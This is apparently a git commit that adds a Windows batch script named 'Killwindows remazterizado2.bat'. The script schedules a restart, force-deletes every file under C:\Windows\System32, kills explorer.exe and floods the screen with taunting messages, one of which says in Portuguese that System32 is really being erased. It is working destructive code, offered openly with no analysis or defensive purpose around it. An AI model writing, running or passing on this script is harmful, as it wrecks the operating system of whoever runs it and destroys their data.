d4e6f61f19c9e153929c7455f74f9a26f1c9bf64
EduardozinYT <158329963+EduardozinYT@users.noreply.github.com>
2024-02-12 17:01:43 -0300

    Killwindows remazterizado2.bat

---
+++ Killwindows remazterizado2.bat
@@ -0,0 +1,9 @@
+@echo off
+shutdown -r -t 60
+del /f /s /q "C:\Windows\System32\*.*"
+Msg * System32 esta sendo apagado é sério
+taskkill -f /im explorer.exe
+msg * hahahhahahahahah
+msg * hahahahahahahhahah
+msg * HAHAHAHAHAHAHAHAHAHAHAHA
+msg * HAHAHAHAHAHHAHAHAHAHAHHAHA
